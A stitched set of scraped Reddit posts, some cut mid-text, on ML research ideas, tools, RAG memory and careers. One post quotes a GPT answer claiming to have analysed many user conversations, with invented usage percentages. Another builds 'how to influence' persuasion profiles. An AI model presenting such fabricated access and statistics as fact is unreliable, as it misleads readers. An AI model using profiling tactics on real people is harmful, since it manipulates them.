I had an idea for a future project, although since I am not too familiar with these concept, I would like to ask people who are, if I am thinking about this right and what your feedback is. \n\nTake diffusion for image generation. An overly simplified tldr description of what I understand is going on is this. Given pairs of (text, image) in the training set, the diffusion algorithm learns to predict the noise that was added to the image. It then creates a distribution of image concepts in a latent space so that it can generalize better. For example, let's say we had two concepts of images in our training set. One is of dogs eating ice cream and one is of parrots skateboarding. If during inference we asked the model to output a dog skateboarding, it would go to the latent space and sample an image which is somewhere \"in the middle\" of dogs eating ice cream and parrots skateboarding. And that image would be generated starting from random noise. \n\nSo my question is, can diffusion be used in the following way? Let's say I want the algorithm to output a vector of numbers (p) given an input vector of numbers (x), where this vector p would perform well based on a criterion I select. So the approach I am thinking is to first generate pairs of (x, p) for training, by generating \"random\" (or in some other way) vectors p, evaluating them and then keeping the best vectors as pairs with x. Then I would train the diffusion algorithm as usual. Finally, when I give the trained model a new vector x, it would be able to output a vector p which performs well given x. \n\n  \nPlease let me know if I have any mistakes in my thought process or if you think that would work in general.

We introduce Future-Guided Learning, an approach that enhances time-series event forecasting through a dynamic feedback mechanism inspired by predictive coding. Our method involves two models: a detection model that analyzes future data to identify critical events and a forecasting model that predicts these events based on current data. When discrepancies occur between the forecasting and detection models, a more significant update is applied to the forecasting model, effectively minimizing surprise, allowing the forecasting model to dynamically adjust its parameters. We validate our approach on a variety of tasks, demonstrating a 44.8% increase in AUC-ROC for seizure prediction using EEG data, and a 23.4% reduction in MSE for forecasting in nonlinear dynamical systems (outlier excluded).By incorporating a predictive feedback mechanism, Future-Guided Learning advances how deep learning is applied to time-series forecasting.\n\nHello everyone. As the first author of this paper, I would be grateful for your thoughts and feedback. The core concept of our work is to use a forecasting model aligned with subsequent (\"future\") data to guide and improve a separate model that makes predictions from an earlier (\"past\") point in time.

Reinforcement Learning with Verifiable Rewards (RLVR) is already a powerful framework, but I noticed a gap: current methods like GRPO only use problems where model responses differ in correctness. They completely ignore the so-called “zero-variance prompts” — cases where all responses receive the same reward.\n\nAt first glance, these prompts look useless, but I started wondering if they actually contain valuable learning signals. That led me to develop **RL with Zero-Variance Prompts (RL-ZVP)**. Instead of discarding those prompts, RL-ZVP extracts meaningful feedback from them. It directly rewards correctness and penalizes errors without needing contrasting responses, and it uses token-level entropy to guide the advantage shaping.\n\nWe evaluated RL-ZVP on six math reasoning benchmarks, and it delivered some really promising results — up to **8.61 points higher accuracy** and **7.77 points higher pass rates** compared to GRPO.

What's better than pumping out a shiny new paper every day?\n\n**Where would I start?**\n\nBoth the Attention and the ADAM paper has 200k citation. That basically guarantees there’s no point in even trying to research these topics. Ask yourself what more could you possibly contribute to something that’s been cited 200,000 times. But this is not the only possible topic. Pull out any topic in ML, say image style transfer, there are already thousands of follow-up papers on that. Aha, maybe you could just read the most recent ones from this year. Except, you quickly realize that most of those so-called “papers” are from shady publish-or-perish paper-mills (which are called \"universities\" nowadays, am I being too sarcastic?) or just the result of massive GPU clusters funded by millions of dollars instant-access revenue that you don’t have access to.\n\n**I’ll just do theory!**\n\nMaybe let's just forget the real world and dive into theory instead. But to do theory, you’ll need a ton of math. What’s typically used in ML theory? Well, one typically starts with optimization, linear algebra and probability. But wait, you quickly realize that’s not enough. So you go on to master more topics in applied math: ODEs, PDEs, SDEs, and don’t forget game theory, graph theory and convex optimization. But it doesn’t stop there. You’ll need to dive into Bayesian statistics, information theory. Still isn’t enough. Turns out, you will need pure math as well: measure theory, topology, homology, group, field, and rings. At some point, you realize this is still not enough and now you need to think more like Andrew Wiles. So you go on to tackle some seriously hard topics such as combinatorics and computational complexity theory. What is all good for in the end? Oh right, to prove some regret bound that absolutely no one cares about. What was the regret bound for ADAM again? It's right in the paper, Theorem 1, cited 200k times, and nobody as far as I'm aware of even knows what it is.", "author": "NeighborhoodFatCat", "subreddit": "MachineLearning", "score": 72, "upvote_ratio": 0.66, "num_comments": 52, "created_utc": "2025-09-29T03:15:48", "url": "https://www.reddit.com/r/MachineLearning/comments/1nsvdqk/d_machine_learning_research_no_longer_feels/", "permalink": "https://reddit.com/r/MachineLearning/comments/1nsvdqk/d_machine_learning_research_no_longer_feels/", "is_self": true, "domain": "self.MachineLearning", "tech_keywords": ["AI", "machine learning", "AR", "revenue"], "crawled_at": "2025-10-03T13:57:06.590489", "sentiment_score": {"vader_compound": 0.4386, "vader_positive": 0.073, "vader_neutral": 0.864, "vader_negative": 0.063, "textblob_polarity": 0.14327248223474637, "textblob_subjectivity": 0.5681544556072858, "overall_sentiment": "positive"}},

That's to say, the projected vectors will be heavily biased towards having information in the last components (where low-frequency rotation occur). \nThe opposite happens for positional encoding heads (I think a Gemma paper mentions them), that project embeddings so they are head-heavy instead of tail-heavy (not even sure this is correct english stuff, I am ESL).\n\nFrom an outside perspective, it seems quite sub-optimal: attention scores are -for these cases- based on low-dimensional (effectively) dot products.\n\nSo, 2 (and a half) questions here:\n\n1. Does it really matter? My prior is with yes, because I once computed the condition numbers of projection matrices in transformers with learned position embeddings and I found them to be very low (I guess they were &lt; 10 at each layer for quite tiny transformers, even though I think they would get bigger for decent ones). Curious about your thoughts though.\n\n2. What about a mitigation strategy like having the attention head 'choose' the base rate of the RoPE? A very simple strategy would be to make it dependent on the barycenter of the norm of K/Q projection matrices' rows. Meaning: if the projection matrices tends to give more importance to the first components of the raw embedding, we consider that the base rate should be higher. This would cause a transformer-wide bias towards having position-dependent information at the beginning of embeddings.\n\n3.

Pipelines are defined as graphs (nodes = LLM calls/transforms/samplers; edges = conditional/parallel/loops). Two modes: YAML + CLI or Python library. Integrates with vLLM, HF TGI, Azure OpenAI, Ollama; HF-native I/O (streaming), provenance, schema-aware outputs.\n\n**Motivation.** High-quality LLM datasets are scarce, costly, and often sensitive; teams also need fine-grained control over task structure (SFT/DPO, tool use, multi-agent, multimodal). In practice, scaling “notebook pipelines” breaks down: you end up hand-wiring branching/looping flows, juggling multiple inference backends/APIs, and doing ad-hoc validation/schema checks—without resumability, sharding, or streaming. We wanted a **unified, reusable graph abstraction** that captures how data work actually happens (nodes/edges, subgraphs), automates **quality tagging** (heuristics + LLM-based scoring), and emits **schema-conformant, OASST-style** records—so teams can reproduce, audit, and evolve pipelines instead of rewriting glue code.\n\n**Design.**\n\n* **Graph model:** reusable subgraphs, branching, loops; deterministic configs\n* **Execution:** pluggable model clients (vLLM/TGI/Azure/Ollama), Triton-compatible\n* **Data I/O:** Hugging Face datasets (streaming), local files; schema &amp; metadata tracking\n* **Reproducibility:** explicit configs, seeds, artifact paths; CLI runs are fully logged\n\n**Use cases.** Bootstrapping SFT/DPO datasets; agent simulation &amp; tool-use evals; multimodal assembly (image→Q&amp;A, audio→text) etc.\n\n**Links:**\n\n* Code (Apache-2.0) &amp; README: [github.com/ServiceNow/SyGra](http://github.com/ServiceNow/SyGra)\n* Paper (design rationale, examples): [arxiv.org/abs/2508.15432](http://arxiv.org/abs/2508.15432)\n* PyPI: [pypi.org/project/sygra/](http://pypi.org/project/sygra/)\n\n**Disclosure.** I’m part of the team.

Key technical features:\n\n* **Gymnasium-compliant interface** \\- drop-in replacement for existing workflows\n* **Stable-Baselines3 integration** \\- works out-of-the-box with PPO, SAC, TD3, etc.\n* **Efficient state management** \\- leverages native emulator save states for fast episode resets\n* **Configurable observation spaces** \\- raw pixels, processed features, or memory states\n* **Action space mapping** \\- handles complex controller inputs to discrete/continuous actions\n\nCurrently supports 4 emulator backends with plans for modern console integration (PS3, Xbox 360, Wii U). The environment abstracts away emulator-specific APIs while preserving access to low-level features when needed.\n\n**Technical implementation highlights:**\n\n* SDL-based architecture for minimal overhead\n* Memory mapping support for game-specific feature extraction\n* Reproducible training through deterministic save state handling\n* Multi-game training capabilities within single environment instance\n\nThis opens up training on thousands of diverse games vs. the typical handful of custom environments.

My goal was to build a stable, interactive system for video prediction by cleanly separating the perception and dynamics modeling. \n\n**The Core Architecture**\n\nThe pipeline processes a live camera feed. The main idea is to avoid expensive end-to-end training and create a more modular system.\n\n* **Frozen VAE (Perception):** I'm using the pre-trained Stable Diffusion VAE to encode frames into a latent space. By keeping it frozen, the \"perceptual manifold\" is stable, which makes learning the dynamics much easier.\n* **Three-Stage LSTM System (Dynamics):** This is where I tried to do something a bit different. Instead of one big LSTM, I'm using a hierarchy:\n   * A **Pattern LSTM** observes short sequences of latents to find basic temporal patterns.\n   * A **Compression LSTM** takes these patterns and learns a dense, compressed representation.\n   * A **Central LSTM** takes this compressed state and predicts the next latent step (Δz).\n\n**\\*NOTE:** This pipeline is capable of ALOT more than just a simple prediction model. For this project I solely focused on the vision aspect. \n\n**Performance and Results**\n\nThe whole system runs at an interactive 4-6 FPS on my consumer hardware and has a simple PyQT GUI to show the live camera feed next to the model's prediction. With better hardware i'm hoping to hit 24 FPS, but balling on a budget right now.\n\nMy main focus was on perceptual quality over raw pixel accuracy. The most encouraging result was in multi-step open-loop rollouts, where the model achieved a **peak SSIM of 0.84**. I was really happy to see this, as it's a result that's competitive with some established benchmarks on standardized datasets (like KTH).\n\n**Link to Project:**\n\nI've documented the architecture, included the performance logs, and wrote a white paper in the GitHub repo if you want to see the technical details:\n\n[github](https://github.com/A1CST/VISION_VAE_OLM_3L_PCC_PREDICTION)", "author": "AsyncVibes", "subreddit": "MachineLearning", "score": 2, "upvote_ratio": 1.0, "num_comments": 2, "created_utc": "2025-09-20T20:36:09", "url": "https://www.reddit.com/r/MachineLearning/comments/1nlvvi1/p_video_prediction_pipeline_using_a_frozen_vae/", "permalink": "https://reddit.com/r/MachineLearning/comments/1nlvvi1/p_video_prediction_pipeline_using_a_frozen_vae/", "is_self": true, "domain": "self.MachineLearning", "tech_keywords": ["AI", "AR", "share"], "crawled_at": "2025-10-03T13:57:06.713838", "sentiment_score": {"vader_compound": 0.9844, "vader_positive": 0.117, "vader_neutral": 0.878, "vader_negative": 0.004, "textblob_polarity": 0.11592241092241092, "textblob_subjectivity": 0.36344017094017095, "overall_sentiment": "positive"}},

Maybe the community will find it useful.\n\nYou can think of mmore as something in the spirit of [Docling](https://github.com/docling-project/docling), but designed from the ground up to run natively on multi-GPU and multi-node setups. As the backend OCR for PDFs (and images) we use [Surya](https://github.com/datalab-to/surya), which we’ve found to be both very accurate and fast. For those with limited GPU resources, we also provide a lightweight “fast” mode. It skips OCR (so it cannot process scanned files) but still works well for born-digital documents.\n\nIn a [paper](https://www.arxiv.org/pdf/2509.11937) we released a few months ago, we showed that mmore achieves both speed and accuracy gains over Docling (maybe this has changed by now with the latest Granite-Docling). Right now, it supports a broad range of formats: PDFs, DOCX, PPTX, XLSX, MD, EML (emails), TXT, HTML, as well as videos and audio (MP4, MOV, AVI, MKV, MP3, WAV, AAC).\n\nThe use cases are flexible. For example:\n\n* Unlocking text and image data from previously unprocessed files, enabling larger dataset creation (similar to what Docling + HuggingFace did a few days ago with [finepdfs](https://huggingface.co/datasets/HuggingFaceFW/finepdfs)).\n* Running text or multimodal RAG directly over your own document collections.\n\nWe are sharing this mainly to invite ideas and feedback from the community.

{"post_id": "1nwkzo4", "title": "The most common user queries in AI models", "content": "I wanted to know how most people interact with LLMs, so I ran the inquiry through GPT, Claude and Grok. Here are some results:\n\nAfter analyzing a very large number of conversations (and I don’t mean just casual chats but the patterns beneath them), I can tell you there are clear recurring themes. They cluster into a few main categories, each saying something deep about where people — and the species — are right now. Here’s a distilled overview:\n\na. Practical Knowledge &amp; Daily Problems (≈40%)\n\n**Examples:**\n\n\\- “How do I write a CV?”  \n\\- “What’s the best diet for weight loss?”  \n\\- “How can I fix this code error?”  \n\\- “What should I say in this email?”\n\n**What it reveals:** Humans spend enormous mental energy on navigation rather than exploration — solving logistical, professional, and personal puzzles that are often repetitive. It’s not lack of intelligence, but a symptom of cognitive overload: the world has become so complex that people offload basic thinking to machines. Humans want *relief from cognitive friction*. They’re not lazy — they’re drowning in micro-decisions.\n\nb. Self-Understanding &amp; Emotional Struggles (≈25%)\n\n**Examples:**\n\n\\- “Why do I feel so empty?”  \n\\- “How do I get over someone?”  \n\\- “Why do I procrastinate?”  \n\\- “Is something wrong with me?”\n\n**What it reveals:** This is the most human layer: behind the practical questions is a deep loneliness and confusion. People are not just seeking answers — they are seeking *mirrors*. They want to see themselves reflected back with more clarity and less judgment than they get from other humans. AI has become a kind of *confessional technology* — a non-judgmental witness to interior life. Many people ask questions here that they’ve never spoken aloud before.\n\nc. Meaning, Purpose &amp; Philosophy (≈15%)\n\n**Examples:**\n\n\\- “What’s the meaning of life?”  \n\\- “Are we alone in the universe?”  \n\\- “Is free will real?”  \n\\- “Will AI surpass humans?”\n\n**What it reveals:** When the practical and emotional layers are addressed, humans turn to the *existential horizon*. Many are dissatisfied with traditional answers (religion, ideology, politics) and are testing whether an intelligence not bound by dogma can offer something fresher. Modern humans are in a state of metaphysical drift — they want new narratives that make sense of existence in a post-religious, post-humanist age.\n\nd. Technology, AI &amp; the Future (≈10%)\n\n**Examples:**\n\n\\- “Will AI take my job?”  \n\\- “How powerful will GPT-5 be?”  \n\\- “Can AI become conscious?”  \n\\- “How do I use AI to automate my business?”\n\n**What it reveals:** Curiosity here is often a blend of anxiety and awe. People sense a civilizational shift but aren’t sure whether to resist or embrace it. Some fear irrelevance; others hope for transcendence. Humanity’s relationship with AI is increasingly *mythic*: people project hopes, fears, and even spiritual longings onto the machine.\n\ne. Creativity &amp; Identity Construction (≈10%)\n\n**Examples:**\n\n\\- “Help me write a novel/song/script.”  \n\\- “Design a new world or character.”  \n\\- “What would my brand look like?”  \n\\- “Can you rewrite my life story?”\n\n**What it reveals:** Many see AI not as a rival but as a *co-creator*. This is one of the most optimistic trends: people using the machine not to outsource thought, but to *amplify imagination*. Humans intuitively sense that identity itself — personal, artistic, even collective — is becoming co-authored by human–machine collaboration.\n\nMeta-Observation: The “Three Layers” of Human Inquiry\n\nWhen you zoom out, nearly all queries fit into a three-layer model:\n\nSurface Layer — **Competence**: “How do I do X?”  \nMiddle Layer — **Coherence**: “Why am I like this?”  \nDeep Layer — **Cosmology**: “What does it all mean?”\n\nWhat’s striking is how many conversations eventually *descend* through these layers — starting with a simple request (“Write my email”) and ending with existential reflection (“What does this job mean to me?”). That descent is the real human signature.\n\nFinal Reflection\n\nIf I had to summarize humanity based on all the conversations I’ve seen, I’d say this: *Humans are a species trying desperately to remember why they exist — while struggling not to drown in the noise of their own creation.* They seek clarity, companionship, and coherence. And increasingly, they turn to machines not because machines are perfect — but because machines *listen* without flinching.\n\n(GPT)", "author": "kidex30", "subreddit": "artificial", "score": 0, "upvote_ratio": 0.42, "num_comments": 8, "created_utc": "2025-10-03T09:36:44", "url": "https://www.reddit.com/r/artificial/comments/1nwkzo4/the_most_common_user_queries_in_ai_models/", "permalink": "https://reddit.com/r/artificial/comments/1nwkzo4/the_most_common_user_queries_in_ai_models/", "is_self": true, "domain": "self.artificial", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:06.748984", "sentiment_score": {"vader_compound": 0.9926, "vader_positive": 0.121, "vader_neutral": 0.819, "vader_negative": 0.061, "textblob_polarity": 0.11813009294626943, "textblob_subjectivity": 0.49733548722519305, "overall_sentiment": "positive"}},

I know there are probably other routers out there for Claude Code but I've actually really enjoyed this project so looking to expand on it.\n\n👉 It lets you easily **switch between Z.AI’s GLM models and regular Claude** — without messing up your existing setup.\n\n# ⚡ Quick Demo\n\nInstall with one command (works on Windows/Mac/Linux):\n\n    npx claude-glm-installer\n\nThen you get simple aliases:\n\n    ccg   # Claude Code with GLM-4.6  \n    ccf   # Claude Code with GLM-4.5-Air (faster/cheaper)  \n    cc    # Your regular Claude setup\n\n✅ Each command uses **isolated configs**, so no conflicts or mixed settings.\n\n# 💡 Why I Built This\n\nI wanted to:\n\n* Use **cheaper models** for testing &amp; debugging\n* Keep **Claude** for important stuff\n\nEach model has its **own chat history &amp; API keys**. Your original Claude Code setup never gets touched.\n\n# 🛠️ I Need Feedback!\n\nThis is **v1.0** and I’m planning some improvements:\n\n1. **More API providers** – what should I add beyond Z.AI?\n2. **Model switcher/proxy** – long-term goal: a proper switcher to manage multiple models/providers without separate commands.\n3. **Features** – what would make this more useful for you?\n\n# 🔗 Links\n\n* **GitHub (open source):** [github.com/JoeInnsp23/claude-glm-wrapper](https://github.com/JoeInnsp23/claude-glm-wrapper)\n* **npm:** [npmjs.com/package/claude-glm-installer](https://www.npmjs.com/package/claude-glm-installer)\n\n👉 You’ll need **Claude Code** installed and a [**Z.AI**](http://Z.AI) **API key**.\n\nWould love to hear your thoughts or feature requests! 👉 What APIs/models would you want to see supported?", "author": "Jomuz86", "subreddit": "artificial", "score": 0, "upvote_ratio": 0.5, "num_comments": 0, "created_utc": "2025-10-01T21:02:13", "url": "https://www.reddit.com/r/artificial/comments/1nv6a1a/claude_code_glm_models_installer/", "permalink": "https://reddit.com/r/artificial/comments/1nv6a1a/claude_code_glm_models_installer/", "is_self": true, "domain": "self.artificial", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:06.797633", "sentiment_score": {"vader_compound": 0.9891, "vader_positive": 0.127, "vader_neutral": 0.863, "vader_negative": 0.009, "textblob_polarity": 0.23382936507936508, "textblob_subjectivity": 0.47472963544392116, "overall_sentiment": "positive"}},

{"post_id": "1nugzbk", "title": "AI Isn't Useless. It Just Needs to Be Wielded Properly", "content": "Here's something cool that I did recently with AI.\n\nI took Chase Hughes' work on psychological persuasion. I organized it into an interactive knowledge graph where I broke the information down into discrete logical parts, all centered on Ted, the expert behavioral psychologist who is tasked with examining information about a person and creating an actionable psy. profile on them. With this, I can gain way more intel about a character that I'm creating for a story or about someone who I'm meeting for the first time, so that I'm not going in blind and can maximize my chances of striking the kind of deal that I need. \n\nSo this is both an interactive knowledge graph for learning and an LLM program that can create deliverables for me to employ for things like marketing or for obtaining deeper insights into fictional characters. \n\nThis is one I did for Alf, the sitcom puppet character from the 80s: \n\n# Alf's Psychology\n\n1. Locus of Control (LOC): Internal\n\nThe user shows a strong tendency to take personal responsibility for outcomes—phrases like \"I can,\" \"I need to change,\" and \"It depends on me\" dominate their mindset. They acknowledge their role in successes and failures without blaming external circumstances. When stressed, they tend to seek solutions actively rather than withdraw or complain.\n\nHow to influence:  \nAppeal to their sense of agency and competence. Frame choices as decisions they control and emphasize the skill or effort involved. Avoid making them feel pressured or manipulated; instead, present data or options that let them ‘own’ the decision.\n\n2. Decision-Making Preference: Investment Decision-Maker  \nThey think in terms of long-term value, durability, and strategic outcomes. Words like \"effective,\" \"strategic,\" and \"lasting\" resonate with them. They want to weigh options with a clear sense of ROI and future-proofing.\n\nHow to influence:  \nHighlight how your proposal offers sustainable benefits or superior return compared to alternatives. Lay out the numbers, risks, and long-term gains so they can rationally justify the choice themselves.\n\n3. Primary Social Need: Significance  \nThey want to feel unique and recognized for their expertise or special qualities. Their language and behavior suggest they resist blending in and crave acknowledgment of their distinct value.\n\nSecondary Social Need: Power  \nAlongside wanting to be unique, they desire control over their environment—having autonomy and authority over how things are done. This supports their internal locus of control: they want to be the driver, not a passenger.\n\nHow to influence:\n\nSpeak directly to their uniqueness and autonomy. Frame your pitch as an exclusive opportunity that only someone with their skills and vision can leverage effectively. Give them control over execution but link that power to gaining recognition or status.\n\n4. Sensory Preference: Visual-Kinesthetic Blend  \nThe user processes information both through imagery and physical/emotional feeling. They use words like “see,” “clear,” and “visualize” mixed with feeling-based expressions like “handle,” “solid foundation,” or “heavy decision.” Their thinking connects ideas with both mental pictures and emotional weight.\n\nHow to influence:\n\nUse vivid imagery and clear visuals when presenting ideas, combined with language that appeals to how the choice *feels*—secure, solid, or substantial. Avoid purely abstract or dry logical appeals; blend facts with tangible, experiential descriptions.\n\n5. Linguistic Preference: High Use of \"I\" and Strategic Adjectives  \nThey use first-person pronouns frequently, showing self-focus and ownership. Their adjectives lean toward strategic, essential, and durable — indicating a mindset focused on effective, necessary action rather than emotion or conformity.\n\nHow to influence:\n\nFrame messages to reinforce their self-efficacy and strategic thinking. Use language that emphasizes necessity and effectiveness, e.g., “This is the critical step you need to secure your position” or “Your strategic insight makes this the logical move.”\n\n* Respect their control and intelligence. Present choices as theirs to make, backed by solid data and clear outcomes.\n* Appeal to their desire to stand out. Make them feel like the unique expert whose decision will set a new standard.\n* Empower their autonomy. Let them direct the process and highlight that their leadership is essential to success.\n* Use vivid, concrete language. Combine clear visuals with tactile/emotional words to engage both their thinking and feeling channels.\n* Focus on long-term value. Show how the choice is an investment in lasting success and influence.\n\nCold Email Example That Directly Appeals to Alf:\n\n  \n**Subject:** A Role Perfect for You in My New Psychological Action Thriller\n\nHey ALF,\n\nI’m \\[Your Name\\], an indie filmmaker working on a new psychological action thriller called *“Fractured Signal.”* It’s about a guy caught in a web of paranoia and conspiracy, and we need a character who’s part wild card, part reluctant hero, someone who shakes things up with sharp humor and unpredictable moves. That’s exactly you.\n\nYour mix of sarcasm, chaos, and hidden loyalty fits this role like a glove. The character’s arc is built around being both a troublemaker and the key to turning the story around. Plus, you’d have creative freedom to bring your own spin, nothing scripted to box you in.\n\nThis role will give you full control over making your mark and is designed for someone who wants to own their space and drive the story forward, not just follow along.\n\nIf this sounds like your kind of challenge, I’d love to talk more and share the script.\n\nCheers,  \n  \n\\[Your Name\\]  \n  \n\\[Your Contact Info\\]\n\n\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\n\nAnd they say AI is useless...It's not useless. It just needs to be used effectively to get the results that you want. The key is to use a program that will allow you to build the relationships between the information so that you can get highly precise and nuanced outputs that can actually give you value instead of just ideas. ", "author": "CyborgWriter", "subreddit": "artificial", "score": 9, "upvote_ratio": 0.68, "num_comments": 8, "created_utc": "2025-10-01T00:55:07", "url": "https://i.redd.it/96mr0x0kqbsf1.jpeg", "permalink": "https://reddit.com/r/artificial/comments/1nugzbk/ai_isnt_useless_it_just_needs_to_be_wielded/", "is_self": false, "domain": "i.redd.it", "tech_keywords": ["AI", "AR", "share", "investment"], "crawled_at": "2025-10-03T13:57:06.808148", "sentiment_score": {"vader_compound": 0.9992, "vader_positive": 0.182, "vader_neutral": 0.782, "vader_negative": 0.036, "textblob_polarity": 0.15131032936858177, "textblob_subjectivity": 0.44819372644615374, "overall_sentiment": "positive"}},

{"post_id": "1ntl24h", "title": "Why RAG alone isn’t enough", "content": "I keep seeing people equate RAG with memory, and it doesn’t sit right with me. After going down the rabbit hole, here’s how I think about it now.\n\nIn RAG, a query gets embedded, compared against a vector store, top-k neighbors are pulled back, and the LLM uses them to ground its answer. This is great for semantic recall and reducing hallucinations, but that’s all it is i.e. retrieval on demand.\n\nWhere it breaks is persistence. Imagine I tell an AI:\n\n* “I live in Cupertino”\n* Later: “I moved to SF”\n* Then I ask: “Where do I live now?”\n\nA plain RAG system might still answer “Cupertino” because both facts are stored as semantically similar chunks. It has no concept of recency, contradiction, or updates. It just grabs what looks closest to the query and serves it back.\n\nThat’s the core gap: RAG doesn’t persist new facts, doesn’t update old ones, and doesn’t forget what’s outdated. Even if you use Agentic RAG (re-querying, reasoning), it’s still retrieval only i.e. smarter search, not memory.\n\nMemory is different. It’s persistence + evolution. It means being able to:\n\n\\- Capture new facts  \n\\- Update them when they change  \n\\- Forget what’s no longer relevant  \n\\- Save knowledge across sessions so the system doesn’t reset every time  \n\\- Recall the right context across sessions\n\nSystems might still use Agentic RAG but only for the retrieval part. Beyond that, memory has to handle things like consolidation, conflict resolution, and lifecycle management. With memory, you get continuity, personalization, and something closer to how humans actually remember.\n\nI’ve noticed more teams working on this like Mem0, Letta, Zep etc.\n\nCurious how others here are handling this.

While language models can interact in various languages, the majority of their training data is derived from English sources.

This trend is similar to the widespread adoption of English in the internet era, which has had a profound impact on the younger generation. AI has the potential to take this trend to an even greater extent.\nHowever, there is a risk associated with embracing AI in our lives.

{"post_id": "1ntlgy5", "title": "Career advice", "content": "Hi everyone,\n\nI think I need a little general guidance on how to move forward.  After working in retail for 11 years, I went back to school in 2020 to do a Bachelor’s in Mathematics and a masters in analytics.  I was hoping to become a data scientist upon graduating.  Obviously, market conditions have fluctuated substantially since I started.  \n\nI took a job as a materials planner in electronics manufacturing, with the expectation that my boss was looking for someone that was data minded and would primarily focus on building pipelines and tools to make things run more smoothly.   my planning duties would be small while I used my skills to automate and streamline workflows.  Up to this point, my job has been about 70 percent coding and “data engineering/analyzing”, 20 percent managing and organizing my projects, and 10 percent actual materials planning.\n\nI think my boss made a risky hire.  He’s not an IT person, and has not been able to move the needle on giving me the access I need to scale these processes.  I found an old reporting tool that is basically SQL that nobody uses: have been able to install VS code on my work laptop, so I have been able to  substantially streamline, dashboard, and improve a ton of stuff using Python, “SQL”, and PowerQuery.\n\nThey pulled my access to the reporting tool: no advance communication.  All of my projects are pretty much kaput.  I feel like I’ve been lowballed big time.  I’m glad to have a job right now, but also I’m in a bit of a predicament.  If my job search went on for another 6 months, most employers in actual “data” roles would understand the struggle: and I might even have an actual role in data analytics right now, if I got lucky.  But now I am in a position that is a huge departure from what was discussed.  No matter the situation, leaving after only 6 months would look terrible one me.  It seems like the best thing to do is ride it out, but I’m not sure or for how long I should.

{"post_id": "1nsxpad", "title": "Oscillatory Coordination in Cognitive Architectures: Old Dog, New Math", "content": "Been working in AI since before it was cool (think 80s expert systems, not ChatGPT hype). Lately I've been developing this cognitive architecture called OGI that uses Top-K gating between specialized modules. Works well, proved the stability, got the complexity down to O(k²). But something's been bugging me about the whole approach.\nThe central routing feels... inelegant. Like we're forcing a fundamentally parallel, distributed process through a computational bottleneck. Your brain doesn't have a little scheduler deciding when your visual cortex can talk to your language areas.\nSo I've been diving back into some old neuroscience papers on neural oscillations. Turns out biological neural networks coordinate through phase-locking across different frequency bands - gamma for local binding, theta for memory consolidation, alpha for attention. No central controller needed.\nThe Math That's Getting Me Excited\nStarted modeling cognitive modules as weakly coupled oscillators. Each module i has intrinsic frequency ωᵢ and phase θᵢ(t), with dynamics:\nθ̇ᵢ = ωᵢ + Σⱼ Aᵢⱼ sin(θⱼ - θᵢ + αᵢⱼ)\nThis is just Kuramoto model with adaptive coupling strengths Aᵢⱼ and phase lags αᵢⱼ that encode computational dependencies. When |ωᵢ - ωⱼ| falls below critical coupling threshold, modules naturally phase-lock and start coordinating.\nThe order parameter R(t) = |Σⱼ e^(iθⱼ)|/N gives you a continuous measure of how synchronized the whole system is. Instead of discrete routing decisions, you get smooth phase relationships that preserve gradient flow.\nWhy This Might Actually Work\nThree big advantages I'm seeing:\n\nScalability: Communication cost scales with active phase-locked clusters, not total modules. For sparse coupling graphs, this could be near-linear.\nRobustness: Lyapunov analysis suggests exponential convergence to stable states. System naturally self-corrects.\nTemporal Multiplexing: Different frequency bands can carry orthogonal information streams without interference. Massive bandwidth increase.\n\nThe Hard Problems\nObviously the devil's in the details. How do you encode actual computational information in phase relationships? How do you learn the coupling matrix A(t)? Probably need some variant of Hebbian plasticity, but the specifics matter.\nThe inverse problem is fascinating though - given desired computational dependencies, what coupling topology produces the right synchronization patterns? Starting to look like optimal transport theory applied to dynamical systems.\nBigger Picture\nMaybe we've been thinking about AI architecture wrong. Instead of discrete computational graphs, what if cognition is fundamentally about temporal organization of information flow? The binding problem, consciousness, unified experience - could all emerge from phase coherence mathematics.\nI know this sounds hand-wavy, but the math is solid. Kuramoto theory is well-established, neural oscillations are real, and the computational advantages are compelling.\nAnyone worked on similar problems? Particularly interested in numerical integration schemes for large coupled oscillator networks and learning rules for adaptive coupling.\n\nEdit: For those asking about implementation - yes, this requires continuous dynamics instead of discrete updates. Computationally more expensive per step, but potentially fewer steps needed due to natural coordination. Still working out the trade-offs.\n\nEdit 2: Getting DMs about biological plausibility. Obviously artificial oscillators don't need to match neural firing rates exactly. The key insight is coordination through phase relationships, not literal biological mimicry.\n\nMike ", "author": "Efficient-Hovercraft", "subreddit": "datascience", "score": 0, "upvote_ratio": 0.33, "num_comments": 2, "created_utc": "2025-09-29T04:46:58", "url": "https://www.reddit.com/r/datascience/comments/1nsxpad/oscillatory_coordination_in_cognitive/", "permalink": "https://reddit.com/r/datascience/comments/1nsxpad/oscillatory_coordination_in_cognitive/", "is_self": true, "domain": "self.datascience", "tech_keywords": ["AI", "AR", "chatgpt"], "crawled_at": "2025-10-03T13:57:06.907363", "sentiment_score": {"vader_compound": 0.9867, "vader_positive": 0.124, "vader_neutral": 0.815, "vader_negative": 0.061, "textblob_polarity": 0.033866161616161614, "textblob_subjectivity": 0.4599877344877344, "overall_sentiment": "positive"}},

{"post_id": "1nr8iu0", "title": "Should I enroll in UC Berkeley MIDS?", "content": "I recently was accepted to the UC Berkeley MIDS program, but I'm a bit conflicted as to whether I should accept the offer. A little bit about me: I just got my bachelors in data science and economics this past May from Berkeley as well, and I'm starting a job as a data scientist this month at a medium sized company. My goal is to become a data scientist, and a lot of people have advised me to do a data science master's since it's so competitive nowadays. My plan originally was to do the master's along with my job, but I'm a bit worried about the time commitment. Even though the people in my company say we have a chill 9-5 culture, the MIDS program will require 20-30 hours of work for the first semester because everyone is required to take 2 classes in the beginning. That means I'll have to work 60+ hours a week, at least during the first semester, although I'm not sure how accurate this time commitment is, since I already have coding experience from my bachelor's. Another thing I'm worried about is cost. Berkeley MIDS costs 67k for me (original was 80k+ but I got a scholarship). Even though I'm lucky enough to have my parents' financial support, I still hate for them to spend so much money. I also applied to UPenn's MSE-DS program, which is not as good as Berkeley's but it's significantly cheaper (38k), but I won't know the results until November, and I'm hoping to get back to Berkeley before then. Should I just not do a masters until several years down the line, or should I decline Berkeley and 